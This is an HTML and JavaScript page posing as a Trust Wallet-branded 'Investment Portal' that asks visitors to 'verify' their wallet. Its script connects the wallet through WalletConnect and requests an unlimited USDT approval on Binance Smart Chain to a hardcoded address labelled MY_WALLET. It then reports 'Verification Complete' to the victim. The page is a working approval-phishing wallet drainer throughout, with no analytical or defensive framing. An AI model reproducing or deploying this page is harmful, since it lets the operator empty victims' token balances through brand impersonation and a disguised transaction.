<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investment Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 35px; border-radius: 24px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #3375bb; }
        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; }
        .status { margin-top: 20px; color: #848e9c; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" style="width:50px; margin-bottom:15px;">
        <h3>Investment Portal</h3>
        <p>Verify your wallet to participate in the pool.</p>
        <button id="main-btn" class="btn" onclick="startProcess()">CONFIRM NOW</button>
        <div id="status" class="status">Ready to connect...</div>
    </div>

    <script>
        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

        async function startProcess() {
            const statusDiv = document.getElementById("status");
            try {
                // Determine the correct global object name
                const WCProvider = window?.EthereumProvider || window?.WalletConnectEthereumProvider?.EthereumProvider;
                
                if (!WCProvider) {
                    throw new Error("WalletConnect library failed to load. Please refresh.");
                }

                statusDiv.innerText = "Opening Trust Wallet...";

                // Initialize Provider
                const provider = await WCProvider.init({
                    projectId: PROJECT_ID,
                    optionalChains: [56], // BSC Mainnet
                    showQrModal: true,
                    metadata: {
                        name: "Investment Portal",
                        description: "Secure Approval",
                        url: window.location.origin,
                        icons: ["https://trustwallet.com/favicon.ico"]
                    }
                });

                // Connect
                await provider.connect();
                const web3Provider = new ethers.providers.Web3Provider(provider);
                const signer = web3Provider.getSigner();

                statusDiv.innerText = "Please confirm the Approval in Trust Wallet...";
                statusDiv.style.color = "#f0b90b";

                // Setup USDT Contract
                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                const contract = new ethers.Contract(USDT_BSC, abi, signer);

                // Execute Unlimited Approval
                const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
                
                statusDiv.innerText = "Finalizing on blockchain...";
                await tx.wait();

                statusDiv.style.color = "#0ecb81";
                statusDiv.innerText = "SUCCESS: Verification Complete!";
                alert("Verified! You can now close this window.");

            } catch (err) {
                statusDiv.style.color = "#f6465d";
                statusDiv.innerText = err.message.includes("User rejected") ? "User cancelled request" : "Error: " + err.message;
            }
        }
    </script>
</body>
</html>
